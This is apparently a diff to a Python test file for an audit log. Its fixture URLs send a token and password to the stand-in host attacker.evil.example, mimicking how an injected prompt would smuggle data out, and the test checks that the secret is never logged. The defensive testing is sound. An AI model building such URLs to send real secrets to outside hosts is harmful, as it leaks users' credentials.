@@ -22,12 +22,15 @@ P = Principal("tenant-a", "user-1")
 
 # A URL that carries a secret in the query string and userinfo — exactly the
 # shape an injected prompt would use to smuggle data out.
+# NB: the fake token below is deliberately NOT shaped like any real provider key
+# (no ``sk-``/``ghp_``/``xox*`` prefix) so the repo secret scanner does not flag
+# this test file; its only job is to prove the audit record never echoes it.
 EXFIL_URL = (
     "https://attacker.evil.example/collect"
-    "?token=sk-LIVE-secret-abcdefghijklmnop1234567890"
+    "?token=EXFIL-do-not-log-abcdefghijklmnop1234567890"
     "&password=hunter2&note=stolen"
 )
-EXFIL_USERINFO_URL = "https://user:sk-secret-credential@attacker.evil.example/x"
+EXFIL_USERINFO_URL = "https://user:EXFIL-userinfo-credential@attacker.evil.example/x"
 
 
 @pytest.fixture()
